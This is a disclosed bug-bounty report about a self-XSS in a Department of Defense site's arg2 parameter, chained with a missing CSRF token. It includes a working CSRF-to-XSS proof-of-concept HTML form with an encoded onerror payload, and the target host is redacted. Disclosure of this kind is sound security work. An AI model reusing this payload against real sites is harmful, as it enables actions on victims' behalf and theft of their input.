# Self XSS combine CSRF at https://████████/index.php

## Report Details
- **Report ID**: 485684
- **URL**: https://hackerone.com/reports/485684
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-01-25T00:33:58.163Z
- **Disclosed**: 2020-05-27T14:09:42.717Z

## Reporter
- **Username**: manshum12
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi Team,

I found that https://█████████/index.php has vulnerability by XSS in arg2 parameter. Anyway there is no csrf token tied with the post request. As a result this csrf flaw can make the self-xss as a global reflected xss.

CSRF to XSS PoC 

<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://██████████/index.php" method="POST">
<input type="hidden" name="█████████" value="1" />
<input type="hidden" name="task" value="azrul&#95;ajax" />
<input type="hidden" name="option" value="community" />
<input type="hidden" name="func" value="register&#44;ajaxCheckEmail" />
<input type="hidden" name="no&#95;html" value="1" />
<input type="hidden" name="arg2" value="&#91;&quot;&#95;d&#95;&quot;&#44;&quot;raygame2222&#37;40af&#46;miljvbi9&lt;img&#32;src&#61;a&#32;onerror&#61;alert&#40;1&#41;&gt;lk2ko&quot;&#93;" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

You just need to copy and paste the POC into notepad++ then open it with using firefox or google chrome . After i believe you can see xss window pop up

## Impact

i can using this CSRF file send it to people then wide variety of actions, such as performing arbitrary actions on the victim's behalf, and logging their keystrokes.

## Attachments
No attachments
